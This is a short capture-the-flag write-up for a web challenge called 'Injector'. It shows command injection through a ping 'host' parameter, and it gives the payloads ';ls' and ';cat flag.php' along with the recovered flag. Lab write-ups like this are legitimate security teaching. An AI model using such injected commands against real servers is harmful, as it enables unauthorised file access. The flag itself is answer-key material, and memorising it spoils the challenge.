# Injector
## Statement
> Find the flag for this website

Author: **@skyv3il**

Login: http://34.159.73.xxx:30121/

## Analysis

When reaching the first page we see that a parameter `host=127.0.0.1` is set and the command ping is proceed on it.

We may think that we have access to what is run on this `index.php` file.

The code should look like something like that: `ping($host);` what we may try to do is launch something like this 

By using `;ls`for the host parameter, we see that first the ls command is launched and there are two files in the current directory: flag.php & index.php.

Payload: `http://34.159.73.xxx:30121/index.php?host=;ls`

## Exploitation

We change the parameter to `;cat flag.php`, reaching this link: `http://34.159.73.xxx:30121/index.php?host=;cat%20flag.php` and we get the flag in the source code:

```php
<!--?php


//CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}


?-->
```

Flag: **CTF{C0mm4nd_1nj3c5i0n_1s_E4sy}**